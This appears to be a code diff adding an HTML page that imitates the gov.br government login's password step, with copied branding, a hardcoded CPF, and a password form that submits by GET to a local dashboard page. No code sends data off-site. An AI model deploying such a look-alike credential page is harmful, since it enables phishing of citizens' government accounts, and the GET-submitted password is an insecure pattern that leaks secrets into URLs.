@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gov.br - Digite sua senha</title>
+    <!-- Ícones Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Rawline', sans-serif, Arial, Helvetica;
+        }
+
+        body {
+            background-color: #f8f9fa;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Topo Azul Escuro */
+        .top-bar {
+            background-color: #002256;
+            color: white;
+            padding: 24px 32px;
+            font-size: 15px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        /* Botão de seta para voltar ao login */
+        .btn-voltar {
+            color: white;
+            text-decoration: none;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.2s;
+        }
+
+        .btn-voltar:hover {
+            opacity: 0.8;
+        }
+
+        /* Nav com a Imagem do Logo e Fundo #FDF8F3 */
+        .navbar {
+            background-color: #FDF8F3;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .logo-img {
+            height: 35px;
+            width: auto;
+            display: block;
+        }
+
+        .nav-icons {
+            color: #004085;
+            display: flex;
+            gap: 16px;
+            font-size: 18px;
+        }
+
+        /* Container Principal */
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        /* Card do Form */
+        .card {
+            background: #F5F5F5;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            width: 100%;
+            max-width: 900px;
+            padding: 32px;
+            border: 1px solid #e5e7eb;
+        }
+
+        .card-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+        }
+
+        /* Informações do CPF */
+        .cpf-label {
+            font-size: 12px;
+            color: #555;
+            margin-bottom: 2px;
+        }
+
+        .cpf-value {
+            font-size: 14px;
+            color: #333;
+            font-weight: 500;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            color: #555;
+            margin-bottom: 6px;
+        }
+
+        /* Campo de Senha com Ícone do Olho */
+        .password-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 40px 12px 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .form-control:focus {
+            border-color: #1351b4;
+            box-shadow: 0 0 0 2px rgba(19, 81, 180, 0.2);
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 14px;
+            color: #666;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .forgot-link {
+            display: inline-block;
+            font-size: 13px;
+            color: #1351b4;
+            text-decoration: none;
+            margin-bottom: 28px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Botões Cancelar e Entrar */
+        .buttons-group {
+            display: flex;
+            gap: 16px;
+        }
+
+        .btn-cancel {
+            flex: 1;
+            background-color: white;
+            color: #1351b4;
+            border: 1px solid #1351b4;
+            padding: 12px;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            transition: background 0.2s;
+        }
+
+        .btn-cancel:hover {
+            background-color: #f0f4f9;
+        }
+
+        .btn-submit {
+            flex: 1;
+            background-color: #1351b4;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #0c326f;
+        }
+
+        .footer-link {
+            margin-top: 24px;
+            text-align: center;
+        }
+
+        .footer-link a {
+            color: #1351b4;
+            font-size: 14px;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Faixa Superior Azul (Volta para a tela de login) -->
+    <div class="top-bar">
+        <a href="../templates/login.html" class="btn-voltar" title="Voltar">
+            <i class="fa-solid fa-chevron-left"></i>
+        </a>
+        <span>ENTRAR COM GOV.BR</span>
+    </div>
+
+    <!-- Barra de Navegação com Fundo #FDF8F3 -->
+    <nav class="navbar">
+        <a href="../index.html">
+            <img src="../static/3.jpeg" alt="Logo gov.br" class="logo-img">
+        </a>
+        <div class="nav-icons">
+            <i class="fa-solid fa-circle-half-stroke" title="Alto Contraste"></i>
+            <i class="fa-solid fa-wifi" title="Acessibilidade"></i>
+        </div>
+    </nav>
+
+    <!-- Conteúdo Principal -->
+    <main class="main-container">
+        <div class="card">
+            <h1 class="card-title">Digite sua senha</h1>
+
+            <div class="cpf-label">CPF</div>
+            <div class="cpf-value" id="displayCpf">169.465.086-37</div>
+
+            <form method="GET" action="../templates/dashboard.html">
+                <div class="form-group">
+                    <label for="senha">Senha</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="senha" name="senha" class="form-control" placeholder="Digite sua senha atual" required>
+                        <i class="fa-regular fa-eye toggle-password" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
+                    </div>
+                </div>
+
+                <a href="#" class="forgot-link">Esqueci minha senha</a>
+
+                <div class="buttons-group">
+                    <a href="../templates/login.html" class="btn-cancel">Cancelar</a>
+                    <button type="submit" class="btn-submit">Entrar</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="footer-link">
+            <a href="#">Ficou com dúvidas?</a>
+        </div>
+    </main>
+
+    <!-- Script para Mostrar/Ocultar a Senha e ler o CPF digitado na página anterior -->
+    <script>
+        // Pega o CPF vindo da URL da página de login, se disponível
+        const urlParams = new URLSearchParams(window.location.search);
+        const cpfParam = urlParams.get('cpf');
+        if (cpfParam) {
+            document.getElementById('displayCpf').textContent = cpfParam;
+        }
+
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById('senha');
+            const toggleIcon = document.getElementById('toggleIcon');
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleIcon.classList.remove('fa-eye');
+                toggleIcon.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                toggleIcon.classList.remove('fa-eye-slash');
+                toggleIcon.classList.add('fa-eye');
+            }
+        }
+    </script>
+
+</body>
+</html>
